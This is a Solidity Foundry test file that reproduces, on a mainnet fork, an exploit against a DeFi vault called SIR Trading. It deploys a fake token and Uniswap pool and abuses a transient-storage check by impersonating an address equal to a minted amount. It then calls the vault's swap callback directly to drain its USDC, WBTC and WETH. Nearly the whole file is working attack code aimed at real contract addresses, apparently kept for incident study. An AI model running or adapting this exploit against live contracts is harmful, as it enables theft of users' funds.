// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';
import {IWETH9} from "../../interfaces/IWETH9.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {INonfungiblePositionManager} from "../../utils/INonfungiblePositionManager.sol";
import {IImmutableCreate2Factory} from "../../utils/IImmutableCreate2Factory.sol";
import {ISwapRouter} from "../../utils/ISwapRouter.sol";
import {IQuoter} from "../../utils/IQuoter.sol";
import {Token} from "./Token.sol";
import {IVault} from "./IVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Exploit} from "./Exploit.sol";

interface IToken is IERC20 {
    function mint(address to, uint256 amount) external;
}

contract Exploit_SIRTrading is TestHarness, TokenBalanceTracker, ERC20{
    
    // TODO: Check how to initialize this contract
    constructor() ERC20("TokenA", "A") {
        _mint(address(this), 200000000000000000000000000000000000000000000000000);
    }

    IVault internal constant victim = IVault(0xB91AE2c8365FD45030abA84a4666C4dB074E53E7);
    INonfungiblePositionManager internal constant positionManager = INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    IImmutableCreate2Factory internal constant factory = IImmutableCreate2Factory(0x0000000000FFe8B47B3e2130213B802212439497);
    ISwapRouter internal constant swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IQuoter internal constant quoter = IQuoter(0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6);
    IWETH9 internal constant weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 internal constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 internal constant wbtc = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

    function setUp() external {
        cheat.createSelectFork("mainnet", 22157899);
    }

    function test_attack() external {
        //console.log("Exploit Contract Address:", address(this));
        uint256 wethBalanceA = weth.balanceOf(address(this));
        console.log("WETH Balance of this before exploit:", wethBalanceA);
        bytes memory code = type(Exploit).creationCode;
        //console.log("Exploit Contract Code:");
        //console.logBytes(code);
        //console.log("Balance of tokenA before exploit:", balanceOf(address(this)));
        
        console.log('===== STEP 1: Deploy TokenB and mint tokens =====');
        // Deploy a token to use as debt token
        IToken tokenB = IToken(address(new Token()));

        // Mint some tokens to the attacker contract
        tokenB.mint(address(this), 200000000000000000000000000000000000000000000000000);

        // Approve the victim contract to spend the debt token
        //tokenB.approve(address(victim), type(uint256).max);
        tokenB.approve(address(victim), 200000000000000000000000000000000000000000000000000);

        console.log('===== STEP 2: Create Uniswap pool and mint position =====');
        // Create Uniswap pool for debt token (tokenB) and this contract's token (TokenA)
        positionManager.createAndInitializePoolIfNecessary(
            address(tokenB),
            address(this),
            100, // Fee tier
            79228162514264337593543950336 // Initial sqrt price (Q64.96 format, corresponds to 1:1 ratio)
        );

        // Approve the Uniswap pool to spend the debt token
        tokenB.approve(address(positionManager), 108823205127466839754387550950703);

        // Approve the Uniswap pool to spend this contract's token
        IERC20(address(this)).approve(address(positionManager), 108823205127466839754387550957989);

        // Mint a position in the Uniswap pool
        positionManager.mint(
            INonfungiblePositionManager.MintParams({
                token0: address(tokenB),
                token1: address(this),
                fee: 100,
                tickLower: -190000,
                tickUpper: 190000,
                amount0Desired: 108823205127466839754387550950703,
                amount1Desired: 108823205127466839754387550957989,
                amount0Min: 0,
                amount1Min: 0,
                recipient: address(this),
                deadline: block.timestamp + 1
            })
        );

        console.log('===== STEP 3: Approve swap router and swap tokenB for tokenA =====');
        // Approve swap router to spend tokenA
        IERC20(address(this)).approve(address(swapRouter), type(uint256).max);

        // // Swap tokenB for tokenA using the Uniswap router
        // ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
        //     tokenIn: address(this),
        //     tokenOut: address(tokenB),
        //     fee: 100,
        //     recipient: address(this),
        //     deadline: block.timestamp + 1,
        //     amountIn: 114814730000000000000000000000000000,
        //     amountOutMinimum: 0,
        //     sqrtPriceLimitX96: 0
        // });

        // uint256 amountOut = swapRouter.exactInputSingle(params);

        // Initialize vault

        console.log('===== STEP 4: Initialize vault =====');
        IVault.VaultParameters memory vaultParams = IVault.VaultParameters({
            debtToken: address(tokenB),
            collateralToken: address(this),
            leverageTier: 0
        });

        victim.initialize(vaultParams);

        // uint256 quote = quoter.quoteExactOutputSingle(
        //     address(tokenB),
        //     address(this),
        //     100,
        //     114911995060490773496450901025692826,
        //     0
        // );

        // Mint APE tokens
        // Here, tokensToMint is still in the slot 1 of the transient storage of the victim contract
        // safeguarding the uniswapV3SwapCallback function. We need to find an address that has the same value and
        // then call the uniswapV3SwapCallback function directly.
        console.log('===== STEP 5: Mint APE tokens =====');
        uint256 tokensMinted = victim.mint(
            true, // isAPE
            vaultParams,
            139650998347915452795864661928406629, // amountToDeposit
            1
        );

        //console.log("Tokens minted:", tokensMinted);

        //TODO: Here we should use create2 and deploy a contract with a precalculated address that has the same value as tokensMinted
        // bytes32 salt = 0;
        // bytes bytecode = [];
        // address vanityAddress = factory.safeCreate2(salt, bytecode);

        address vanityAddress = address(uint160(tokensMinted));
        //Log usdc balance before the exploit
        uint256 usdcBalanceBefore = usdc.balanceOf(address(this));
        console.log("USDC Balance of this before exploit:", usdcBalanceBefore);

        vm.startPrank(vanityAddress);

        IVault.Reserves memory reserves = IVault.Reserves({
            reserveApes: 0,
            reserveLPers: 0,
            tickPriceX42: 0
        });

        IVault.VaultState memory vaultState = IVault.VaultState({
            reserve: 0,
            tickPriceSatX42:0,
            vaultId: 0 
        });

        IVault.VaultParameters memory vaultParamsUsdc = IVault.VaultParameters({
            debtToken: address(usdc),
            collateralToken: address(this), // The address of TokenA and exploitCoordinator
            leverageTier: 0
        });

        bytes memory data = abi.encode(msg.sender, address(this), vaultParamsUsdc, vaultState, reserves, false, true);

        uint256 amountToSteal = usdc.balanceOf(address(victim));

        victim.uniswapV3SwapCallback(
            0,
            int256(amountToSteal),
            data
        );

        uint256 usdcBalance = usdc.balanceOf(address(vanityAddress));

        usdc.transfer(address(this), usdcBalance);
        vm.stopPrank();

        //Log usdc balance after the exploit
        uint256 usdcBalanceAfter = usdc.balanceOf(address(this));
        console.log("USDC Balance of this after exploit:", usdcBalanceAfter);
        // Check if the exploit was successful
        
        //balance before of this
        uint256 balanceBefore = wbtc.balanceOf(address(this));
        console.log("WBTC Balance of this before exploit:", balanceBefore);

        // Now keep draining other tokens from the victim contract
        IVault.VaultParameters memory vaultParamsWbtc = IVault.VaultParameters({
            debtToken: address(wbtc),
            collateralToken: address(this), // The address of TokenA and exploitCoordinator
            leverageTier: 0
        });
        
        // Wbtc Data
        data = abi.encode(msg.sender, address(this), vaultParamsWbtc, vaultState, reserves, false, true);
        
        uint256 wbtcBalance = wbtc.balanceOf(address(victim));
        victim.uniswapV3SwapCallback(
            0,
            int256(wbtcBalance),
            data
        );
        //balance after of this
        uint256 balanceAfter = wbtc.balanceOf(address(this));
        console.log("WBTC Balance of this after exploit:", balanceAfter);


       uint256 wethBalance = weth.balanceOf(address(this));
       console.log("WETH Balance of this before exploit:", wethBalance);
        
        IVault.VaultParameters memory vaultParamsWeth = IVault.VaultParameters({
            debtToken: address(weth),
            collateralToken: address(this), // The address of TokenA and exploitCoordinator
            leverageTier: 0
        });

        // Weth Data
        data = abi.encode(msg.sender, address(this), vaultParamsWeth, vaultState, reserves, false, true);

        uint256 wethBalanceVictim = weth.balanceOf(address(victim));
        victim.uniswapV3SwapCallback(
            0,
            int256(wethBalanceVictim),
            data
        );

        uint256 wethBalanceAfter = weth.balanceOf(address(this));
        console.log("WETH Balance of this after exploit:", wethBalanceAfter);
        
    }

    function mint(
        address to,
        uint16 baseFee,
        uint8 tax,
        IVault.Reserves memory reserves,
        uint144 collateralDeposited
    ) external returns (IVault.Reserves memory newReserves, IVault.Fees memory fees, uint256 amount) {
        // This function is called by the victim contract during the minting process
        // It simulates the minting of APE tokens and returns the new reserves, fees, and amount minted
        // The important thing here is that it returns its own address as the amount so it can keep calling the uniswapV3SwapCallback function
        newReserves = IVault.Reserves({
            reserveApes: 10000000000,
            reserveLPers: 0,
            tickPriceX42: 0
        });
        // newReserves = reserves;
        fees = IVault.Fees({
            collateralInOrWithdrawn: 0,
            collateralFeeToStakers: 0,
            collateralFeeToLPers: 0
        });
        amount = uint256(uint160(address(this))); // Return its own address as the amount minted
    }
}